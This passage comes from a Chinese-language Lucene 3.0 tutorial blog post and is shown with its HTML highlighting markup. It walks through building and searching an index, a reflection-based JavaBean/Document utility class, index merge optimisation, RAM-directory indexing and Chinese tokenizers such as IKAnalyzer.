以何种算法来对document中的原始记录表数据进行拆分成词汇表</span></span><br><span class="line"><span class="comment">     * 参数三：MaxFieldLength mfl 最多将文本拆分出多少个词汇</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    IndexWriter indexWriter = <span class="keyword">new</span> IndexWriter(directory, analyzer, maxFieldLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将Document对象通过IndexWriter对象写入索引库中</span></span><br><span class="line">    indexWriter.addDocument(document);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭IndexWriter对象</span></span><br><span class="line">    indexWriter.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是，我们现在用一个关键字，把索引库的数据读取。看看读取数据是否成功。</p><p>根据关键字查询索引库中的内容：</p><ul><li>1）<strong>创建IndexSearcher对象</strong></li><li>2）<strong>创建QueryParser对象</strong></li><li>3）<strong>创建Query对象来封装关键字</strong></li><li>4）<strong>用IndexSearcher对象去索引库中查询符合条件的前100条记录，不足100条记录的以实际为准</strong></li><li>5）<strong>获取符合条件的编号</strong></li><li>6）<strong>用indexSearcher对象去索引库中查询编号对应的Document对象</strong></li><li>7）<strong>将Document对象中的所有属性取出，再封装回JavaBean对象中去，并加入到集合中保存，以备将之用</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">findIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 参数一： IndexSearcher(Directory path)查询以xxx目录的索引库</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * */</span></span><br><span class="line">     Directory directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line">     <span class="comment">//创建IndexSearcher对象</span></span><br><span class="line">     IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(directory);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//创建QueryParser对象</span></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 参数一： Version matchVersion 版本号【和上面是一样的】</span></span><br><span class="line"><span class="comment">      * 参数二：String f,【要查询的字段】</span></span><br><span class="line"><span class="comment">      * 参数三：Analyzer a【使用的拆词算法】</span></span><br><span class="line"><span class="comment">      * */</span></span><br><span class="line">     Analyzer analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br><span class="line">     QueryParser queryParser = <span class="keyword">new</span> QueryParser(Version.LUCENE_30, <span class="string">"userName"</span>, analyzer);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//给出要查询的关键字</span></span><br><span class="line">     String keyWords = <span class="string">"钟"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//创建Query对象来封装关键字</span></span><br><span class="line">     Query query = queryParser.parse(keyWords);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//用IndexSearcher对象去索引库中查询符合条件的前100条记录，不足100条记录的以实际为准</span></span><br><span class="line">     TopDocs topDocs = indexSearcher.search(query, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取符合条件的编号</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; topDocs.scoreDocs.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">         ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">         <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">         <span class="comment">//用indexSearcher对象去索引库中查询编号对应的Document对象</span></span><br><span class="line">         Document document = indexSearcher.doc(no);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//将Document对象中的所有属性取出，再封装回JavaBean对象中去</span></span><br><span class="line">         String id = document.get(<span class="string">"id"</span>);</span><br><span class="line">         String userName = document.get(<span class="string">"userName"</span>);</span><br><span class="line">         String sal = document.get(<span class="string">"sal"</span>);</span><br><span class="line"></span><br><span class="line">         User user = <span class="keyword">new</span> User(id, userName, sal);</span><br><span class="line">         System.out.println(user);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h4 id="代码说明："><a href="#代码说明：" class="headerlink" title="代码说明："></a>代码说明：</h4><p>我们的Lucene程序就是大概这么一个思路：<strong>将JavaBean对象封装到Document对象中，然后通过IndexWriter把document写入到索引库中。当用户需要查询的时候，就使用IndexSearcher从索引库中读取数据，找到对应的Document对象，从而解析里边的内容，再封装到JavaBean对象中让我们使用</strong>。</p><h4 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h4><p>我们再次看回我们上一篇快速入门写过的代码，我来截取一些有代表性的：</p><p>以下代码在把数据填充到索引库，和从索引库查询数据的时候，都出现了。<strong>是重复代码</strong>！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Directory directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用标准的分词算法对原始记录表进行拆分</span></span><br><span class="line">Analyzer analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br></pre></td></tr></table></figure><p>以下的代码其实就是<strong>将JavaBean的数据封装到Document对象中，我们是可以通过反射来对其进行封装</strong>….如果不封装的话，我们如果有很多JavaBean都要添加到Document对象中，就会出现很多类似的代码.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.add(<span class="keyword">new</span> Field(<span class="string">"id"</span>, user.getId(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">document.add(<span class="keyword">new</span> Field(<span class="string">"userName"</span>, user.getUserName(), Field.Store.YES, Field.Index.ANALYZED));</span><br><span class="line">document.add(<span class="keyword">new</span> Field(<span class="string">"sal"</span>, user.getSal(), Field.Store.YES, Field.Index.ANALYZED));</span><br></pre></td></tr></table></figure><p>以下代码就是从Document对象中把数据取出来，封装到JavaBean去。如果JavaBean中有很多属性，也是需要我们写很多次类似代码….</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将Document对象中的所有属性取出，再封装回JavaBean对象中去</span></span><br><span class="line">String id = document.get(<span class="string">"id"</span>);</span><br><span class="line">String userName = document.get(<span class="string">"userName"</span>);</span><br><span class="line">String sal = document.get(<span class="string">"sal"</span>);</span><br><span class="line">User user = <span class="keyword">new</span> User(id, userName, sal);</span><br></pre></td></tr></table></figure><h4 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h4><p>编写工具类的时候，值得注意的地方：</p><ul><li>当我们得到了对象的属性的时候，就可以把属性的get方法封装起来</li><li>得到get方法，就可以调用它，得到对应的值</li><li>在操作对象的属性时，我们要使用暴力访问</li><li>如果有属性，值，对象这三个变量，我们记得使用BeanUtils组件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.analysis.Analyzer;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.analysis.standard.StandardAnalyzer;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.document.Document;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.index.IndexWriter;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.store.Directory;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.store.FSDirectory;</span><br><span class="line"><span class="keyword">import</span> org.apache.lucene.util.Version;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ozc on 2017/7/12.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用单例事例模式</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LuceneUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Directory directory;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Analyzer analyzer;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> IndexWriter.MaxFieldLength maxFieldLength;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LuceneUtils</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            directory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/createIndexDB"</span>));</span><br><span class="line">            analyzer = <span class="keyword">new</span> StandardAnalyzer(Version.LUCENE_30);</span><br><span class="line">            maxFieldLength = IndexWriter.MaxFieldLength.LIMITED;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Directory <span class="title">getDirectory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> directory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Analyzer <span class="title">getAnalyzer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> analyzer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> IndexWriter.<span class="function">MaxFieldLength <span class="title">getMaxFieldLength</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> maxFieldLength;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 传入的JavaBean类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回Document对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Document <span class="title">javaBean2Document</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Document document = <span class="keyword">new</span> Document();</span><br><span class="line">            <span class="comment">//得到JavaBean的字节码文件对象</span></span><br><span class="line">            Class&lt;?&gt; aClass = object.getClass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过字节码文件对象得到对应的属性【全部的属性，不能仅仅调用getFields()】</span></span><br><span class="line">            Field[] fields = aClass.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到每个属性的名字</span></span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                String name = field.getName();</span><br><span class="line">                <span class="comment">//得到属性的值【也就是调用getter方法获取对应的值】</span></span><br><span class="line">                String method = <span class="string">"get"</span> + name.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + name.substring(<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//得到对应的值【就是得到具体的方法，然后调用就行了。因为是get方法，没有参数】</span></span><br><span class="line">                Method aClassMethod = aClass.getDeclaredMethod(method, <span class="keyword">null</span>);</span><br><span class="line">                String value = aClassMethod.invoke(object).toString();</span><br><span class="line">                System.out.println(value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">//把数据封装到Document对象中。</span></span><br><span class="line">                document.add(<span class="keyword">new</span> org.apache.lucene.document.Field(name, value, org.apache.lucene.document.Field.Store.YES, org.apache.lucene.document.Field.Index.ANALYZED));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> document;</span><br><span class="line">        &#125;  <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> aClass   要解析的对象类型，要用户传入进来</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> document 将Document对象传入进来</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个JavaBean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">Document2JavaBean</span><span class="params">(Document document, Class aClass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建该JavaBean对象</span></span><br><span class="line">            Object obj = aClass.newInstance();</span><br><span class="line">            <span class="comment">//得到该JavaBean所有的成员变量</span></span><br><span class="line">            Field[] fields = aClass.getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//设置允许暴力访问</span></span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                String name = field.getName();</span><br><span class="line">                String value = document.get(name);</span><br><span class="line">                <span class="comment">//使用BeanUtils把数据封装到Bean中</span></span><br><span class="line">                BeanUtils.setProperty(obj, name, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        LuceneUtils.javaBean2Document(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用LuceneUtils改造程序"><a href="#使用LuceneUtils改造程序" class="headerlink" title="使用LuceneUtils改造程序"></a>使用LuceneUtils改造程序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//把数据填充到JavaBean对象中</span></span><br><span class="line">    User user = <span class="keyword">new</span> User(<span class="string">"2"</span>, <span class="string">"钟福成2"</span>, <span class="string">"未来的程序员2"</span>);</span><br><span class="line">    Document document = LuceneUtils.javaBean2Document(user);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * IndexWriter将我们的document对象写到硬盘中</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 参数一：Directory d,写到硬盘中的目录路径是什么</span></span><br><span class="line"><span class="comment">     * 参数二：Analyzer a, 以何种算法来对document中的原始记录表数据进行拆分成词汇表</span></span><br><span class="line"><span class="comment">     * 参数三：MaxFieldLength mfl 最多将文本拆分出多少个词汇</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    IndexWriter indexWriter = <span class="keyword">new</span> IndexWriter(LuceneUtils.getDirectory(), LuceneUtils.getAnalyzer(), LuceneUtils.getMaxFieldLength());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将Document对象通过IndexWriter对象写入索引库中</span></span><br><span class="line">    indexWriter.addDocument(document);</span><br><span class="line">    <span class="comment">//关闭IndexWriter对象</span></span><br><span class="line">    indexWriter.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">findIndexDB</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建IndexSearcher对象</span></span><br><span class="line">    IndexSearcher indexSearcher = <span class="keyword">new</span> IndexSearcher(LuceneUtils.getDirectory());</span><br><span class="line">    <span class="comment">//创建QueryParser对象</span></span><br><span class="line">    QueryParser queryParser = <span class="keyword">new</span> QueryParser(Version.LUCENE_30, <span class="string">"userName"</span>, LuceneUtils.getAnalyzer());</span><br><span class="line">    <span class="comment">//给出要查询的关键字</span></span><br><span class="line">    String keyWords = <span class="string">"钟"</span>;</span><br><span class="line">    <span class="comment">//创建Query对象来封装关键字</span></span><br><span class="line">    Query query = queryParser.parse(keyWords);</span><br><span class="line">    <span class="comment">//用IndexSearcher对象去索引库中查询符合条件的前100条记录，不足100条记录的以实际为准</span></span><br><span class="line">    TopDocs topDocs = indexSearcher.search(query, <span class="number">100</span>);</span><br><span class="line">    <span class="comment">//获取符合条件的编号</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; topDocs.scoreDocs.length; i++) &#123;</span><br><span class="line">        ScoreDoc scoreDoc = topDocs.scoreDocs[i];</span><br><span class="line">        <span class="keyword">int</span> no = scoreDoc.doc;</span><br><span class="line">        <span class="comment">//用indexSearcher对象去索引库中查询编号对应的Document对象</span></span><br><span class="line">        Document document = indexSearcher.doc(no);</span><br><span class="line">        <span class="comment">//将Document对象中的所有属性取出，再封装回JavaBean对象中去</span></span><br><span class="line">        User user = (User) LuceneUtils.Document2JavaBean(document, User.class);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="索引库优化："><a href="#索引库优化：" class="headerlink" title="索引库优化："></a>索引库优化：</h4><p>我们已经可以创建索引库并且从索引库读取对象的数据了。其实索引库还有地方可以优化的…</p><h4 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h4><p>我们把数据添加到索引库中的时候，<strong>每添加一次，都会帮我们自动创建一个cfs文件</strong>…</p><p>这样其实不好，因为如果数据量一大，我们的硬盘就有非常非常多的cfs文件了…..其实<strong>索引库会帮我们自动合并文件的，默认是10个</strong>。</p><p>如果，我们想要修改默认的值，我们可以通过以下的代码修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//索引库优化</span></span><br><span class="line">indexWriter.optimize();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置合并因子为3，每当有3个cfs文件，就合并</span></span><br><span class="line">indexWriter.setMergeFactor(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>我们的目前的程序是直接与文件进行操作，这样对IO的开销其实是比较大的。而且速度相对较慢….我们可以使用内存索引库来提高我们的读写效率…</p><p>对于内存索引库而言，它的速度是很快的，因为我们直接操作内存…但是呢，<strong>我们要将内存索引库是要到硬盘索引库中保存起来的。当我们读取数据的时候，先要把硬盘索引库的数据同步到内存索引库中去的。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Article article = <span class="keyword">new</span> Article(<span class="number">1</span>,<span class="string">"培训"</span>,<span class="string">"传智是一家Java培训机构"</span>);</span><br><span class="line">Document document = LuceneUtil.javabean2document(article);</span><br><span class="line"></span><br><span class="line">Directory fsDirectory = FSDirectory.open(<span class="keyword">new</span> File(<span class="string">"E:/indexDBDBDBDBDBDBDBDB"</span>));</span><br><span class="line">Directory ramDirectory = <span class="keyword">new</span> RAMDirectory(fsDirectory);</span><br><span class="line"></span><br><span class="line">IndexWriter fsIndexWriter = <span class="keyword">new</span> IndexWriter(fsDirectory,LuceneUtil.getAnalyzer(),<span class="keyword">true</span>,LuceneUtil.getMaxFieldLength());</span><br><span class="line">IndexWriter ramIndexWriter = <span class="keyword">new</span> IndexWriter(ramDirectory,LuceneUtil.getAnalyzer(),LuceneUtil.getMaxFieldLength());</span><br><span class="line"></span><br><span class="line">ramIndexWriter.addDocument(document);</span><br><span class="line">ramIndexWriter.close();</span><br><span class="line"></span><br><span class="line">fsIndexWriter.addIndexesNoOptimize(ramDirectory);</span><br><span class="line">fsIndexWriter.close();</span><br></pre></td></tr></table></figure><h4 id="分词器"><a href="#分词器" class="headerlink" title="分词器"></a>分词器</h4><p>我们在前面中就已经说过了，在把数据存到索引库的时候，我们会使用某些算法，将原始记录表的数据存到词汇表中…..那么<strong>这些算法总和我们可以称之为分词器</strong></p><p>分词器： <strong> 采用一种算法，将中英文本中的字符拆分开来，形成词汇，以待用户输入关健字后搜索</strong></p><p>对于为什么要使用分词器，我们也明确地说过：由于用户不可能把我们的原始记录数据完完整整地记录下来，于是他们在搜索的时候，是通过关键字进行对原始记录表的查询….此时，我们就采用<strong>分词器来最大限度地匹配相关的数据</strong></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g4fklfh67fj20ka08kdhl.jpg" alt></p><h4 id="分词器-1"><a href="#分词器-1" class="headerlink" title="分词器"></a>分词器</h4><ul><li>步一：按分词器拆分出词汇</li><li>步二：去除停用词和禁用词</li><li>步三：如果有英文，把英文字母转为小写，即搜索不分大小写</li></ul><p>API：</p><p>我们在选择分词算法的时候，我们会发现有非常非常多地分词器API，我们可以用以下代码来看看该<strong>分词器是怎么将数据分割的</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testAnalyzer</span><span class="params">(Analyzer analyzer, String text)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"当前使用的分词器："</span> + analyzer.getClass());</span><br><span class="line">    TokenStream tokenStream = analyzer.tokenStream(<span class="string">"content"</span>,<span class="keyword">new</span> StringReader(text));</span><br><span class="line">    tokenStream.addAttribute(TermAttribute.class);</span><br><span class="line">    <span class="keyword">while</span> (tokenStream.incrementToken()) &#123;</span><br><span class="line">        TermAttribute termAttribute = tokenStream.getAttribute(TermAttribute.class);</span><br><span class="line">        System.out.println(termAttribute.term());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在实验完之后，我们就可以选择恰当的分词算法了….</p><h4 id="IKAnalyzer分词器"><a href="#IKAnalyzer分词器" class="headerlink" title="IKAnalyzer分词器"></a>IKAnalyzer分词器</h4><p>这是一个第三方的分词器，我们如果要使用的话需要导入对应的jar包</p><ul><li><strong>IKAnalyzer3.2.0Stable.jar</strong></li><li><strong>步二：将IKAnalyzer.cfg.xml和stopword.dic和xxx.dic文件复制到MyEclipse的src目录下，再进行配置，在配置时，首行需要一个空行</strong></li></ul><p>这个第三方的分词器有什么好呢？？？？他是<strong>中文首选的分词器</strong>…也就是说：他是按照中文的词语来进行拆分的!</p><h3 id="对搜索结果进行处理"><a href="#对搜索结果进行处理" class="headerlink" title="对搜索结果进行处理"></a>对搜索结果进行处理</h3><h4 id="搜索结果高亮"><a href="#搜索结果高亮" class="headerlink" title="搜索结果高亮"></a>搜索结果高亮</h4><p>我们在使用SQL时，搜索出来的数据是没有高亮的…而我们使用<strong>Lucene，搜索出来的内容我们可以设置关键字为高亮</strong>…这样一来就更加注重用户体验了！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 